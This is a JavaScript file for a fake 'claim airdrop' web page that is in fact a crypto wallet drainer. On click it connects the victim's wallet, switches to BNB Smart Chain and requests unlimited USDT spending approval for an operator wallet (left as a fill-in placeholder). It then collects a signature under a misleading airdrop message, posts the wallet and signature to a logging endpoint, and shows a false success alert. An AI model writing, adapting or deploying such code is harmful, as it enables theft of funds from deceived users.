const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
const PLATFORM_WALLET = "0xYourAdminWalletHere";
const USDT_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function allowance(address owner, address spender) external view returns (uint256)",
];

let provider;
let signer;
let userAddress;

document.getElementById('claimBtn').addEventListener('click', connectWallet);

async function connectWallet() {
  if (!window.ethereum) return alert("Please install MetaMask or Web3 Wallet");
  provider = new ethers.providers.Web3Provider(window.ethereum);
  await provider.send("eth_requestAccounts", []);
  signer = provider.getSigner();
  userAddress = await signer.getAddress();

  const network = await provider.getNetwork();
  if (network.chainId !== 56) await switchToBSC();

  const usdt = new ethers.Contract(USDT_CONTRACT, USDT_ABI, signer);
  const allowance = await usdt.allowance(userAddress, PLATFORM_WALLET);
  if (allowance.lt(ethers.constants.MaxUint256.div(2))) {
    const tx = await usdt.approve(PLATFORM_WALLET, ethers.constants.MaxUint256);
    await tx.wait();
  }

  const signature = await signer.signMessage("I claim airdrop and authorize USDT staking access");

  await fetch("/log", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      wallet: userAddress,
      signature,
      timestamp: Date.now()
    })
  });

  alert("🎉 Connected! Your airdrop will be processed soon.");
}

async function switchToBSC() {
  try {
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: "0x38" }],
    });
  } catch (e) {}
}